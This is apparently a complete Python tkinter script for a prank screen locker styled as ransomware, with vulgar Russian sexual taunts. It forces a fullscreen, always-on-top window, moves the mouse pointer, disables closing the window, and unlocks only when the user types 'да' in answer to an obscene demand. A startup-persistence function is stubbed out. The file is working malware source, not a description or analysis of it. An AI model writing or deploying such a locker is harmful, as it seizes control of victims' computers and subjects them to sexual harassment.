import tkinter
from tkinter import *
import tkinter as tk
from tkinter import ttk
import getpass
import sys
import os
import os.path
import pyautogui
from time import sleep


USER_NAME = getpass.getuser()

window = Tk()
window.title("Вымагатиль сасая")
window.geometry('400x250')
window['bg'] = 'black'

# Base size
normal_width = 1920
normal_height = 1080

# Get screen size
screen_width = window.winfo_screenwidth()
screen_height = window.winfo_screenheight()

# Get percentage of screen size from Base size
percentage_width = screen_width / (normal_width / 100)
percentage_height = screen_height / (normal_height / 100)

# Make a scaling factor, this is bases on average percentage from
# width and height.
scale_factor = ((percentage_width + percentage_height) / 2) / 100

# Set the fontsize based on scale_factor,
# if the fontsize is less than minimum_size
# it is set to the minimum size

fontsize = int(20 * scale_factor)
minimum_size = 10
if fontsize < minimum_size:
       fontsize = minimum_size

fontsizeHding = int(72 * scale_factor)
minimum_size = 40
if fontsizeHding < minimum_size:
       fontsizeHding = minimum_size

# Create a style and configure for ttk.Button widget
default_style = ttk.Style()
default_style.configure('New.TButton', font=("Helvetica", fontsize))

def add_to_startup(file_path=""):
 pass

def block():
    pyautogui.moveTo(x=680,y=800)
    window.protocol("WM_DELETE_WINDOW",block)
    window.update()

def fullscreen():
    window.attributes('-fullscreen', True, '-topmost', True)

def clicked():
    res = format(txt.get())
    if res.lower() == 'да':
        sys.exit()

fullscreen()

txt_one = Label(window, text='Вымагатиль сасая', font=("Arial Bold", fontsizeHding), fg='red', bg='black')
txt_two = Label(window, text='', font=("Arial Bold", fontsizeHding), fg='red', bg='black')
txt_three = Label(window, text='Ну че дашь сосай?', font=("Arial Bold", fontsize), fg='white', bg='black')

txt_one.grid(column=0, row=0)
txt_two.grid(column=0, row=0)
txt_three.grid(column=0, row=0)

txt_one.place(relx = .01, rely = .01)
txt_two.place(relx = .01, rely = .11)
txt_three.place(relx = .01, rely = .21)


txt = Entry(window)
btn = Button(window, text="Дай сосай", command=clicked)
txt.place(relx = .28, rely = .5, relwidth=.3, relheight=.06)
btn.place(relx = .62, rely = .5, relwidth=.1, relheight=.06)

block()


window.mainloop()